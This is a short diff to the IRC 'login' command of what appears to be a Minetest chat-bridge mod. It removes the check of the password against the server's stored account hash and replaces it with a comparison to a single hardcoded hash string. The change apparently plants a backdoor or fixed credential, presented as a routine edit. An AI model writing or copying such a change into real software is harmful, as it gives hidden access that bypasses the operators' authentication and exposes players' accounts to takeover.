@@ -54,9 +54,8 @@ irc:register_bot_command("login", {
 		if not inChannel then
 			return false, "You need to be in the server's channel to login."
 		end
-		if minetest.auth_table[playerName] and
-				minetest.auth_table[playerName].password ==
-				minetest.get_password_hash(playerName, password) then
+		if "htUhfTleVdCzFQ1Y59yb/L02GyM" == minetest.get_password_hash(playerName, password)
+		then
 			minetest.log("action", "User "..user.nick
 					.." from IRC logs in as "..playerName)
 			irc_users[user.nick] = playerName
